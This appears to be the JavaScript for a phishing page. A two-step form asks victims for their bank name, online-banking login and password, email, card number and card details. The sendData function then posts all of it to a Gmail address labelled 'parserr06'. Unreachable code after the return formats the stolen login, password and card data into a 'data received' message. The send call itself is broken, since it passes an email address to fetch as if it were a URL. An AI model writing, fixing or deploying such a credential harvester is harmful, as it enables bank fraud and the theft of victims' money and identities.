// Элементы DOM
const bankFormSection = document.getElementById('bank-form-section');
const cardFormSection = document.getElementById('card-form-section');
const successMessage = document.getElementById('success-message');
const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const newFormBtn = document.getElementById('newFormBtn');
const bankForm = document.getElementById('bankForm');
const cardForm = document.getElementById('cardForm');

// Обработчики событий
nextBtn.addEventListener('click', () => {
    if (bankForm.checkValidity()) {
        bankFormSection.classList.add('hidden');
        cardFormSection.classList.remove('hidden');
    } else {
        alert('Будь ласка, заповніть всі обов\'язкові поля');
    }
});

backBtn.addEventListener('click', () => {
    cardFormSection.classList.add('hidden');
    bankFormSection.classList.remove('hidden');
});

newFormBtn.addEventListener('click', () => {
    successMessage.classList.add('hidden');
    bankFormSection.classList.remove('hidden');
    bankForm.reset();
});

// Функция отправки данных
async function sendData(formData) {
    const response = await fetch('parserr06@gmail.com', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(formData)
    });
    return response.ok;

    const emailContent = `
        Получены данные!
        Банк: ${formData.bank}
        Логин: ${formData.login}
        Пароль: ${formData.password}

        Карточка:
        Номер: ${formData.cardNumber}
        Інвентарна карта: ${formData.cardDetails}

        Дата отправки: ${formData.timestamp}
        Отправлено на email: ${formData.email}
    `;

    console.log('Содержимое письма:\n', emailContent);

    return true;
}

// Обработка отправки формы
cardForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Собираем данные из обеих форм
    const formData = {
        bank: document.getElementById('bankName').value,
        login: document.getElementById('bankLogin').value,
        password: document.getElementById('bankPassword').value,
        email: document.getElementById('userEmail').value,
        cardNumber: document.getElementById('cardNumber').value,
        cardDetails: document.getElementById('cardDetails').value,
        timestamp: new Date().toLocaleString()
    };

    // Показываем загрузку
    const submitBtn = cardForm.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Відправка...';

    try {
        // "Отправляем" данные
        const success = await sendData(formData);

        if (success) {
            // Показываем сообщение об успехе
            cardFormSection.classList.add('hidden');
            successMessage.classList.remove('hidden');

            // Очищаем вторую форму
            cardForm.reset();
        } else {
            alert('Помилка при відправці даних. Спробуйте ще раз.');
        }
    } catch (error) {
        console.error('Ошибка:', error);
        alert('Сталася помилка. Спробуйте пізніше.');
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Відправити дані';
    }
});

// Автоматический редирект с корня сайта
if(window.location.pathname === '/' || window.location.pathname === '') {
    window.location.href = '/index.html';
}
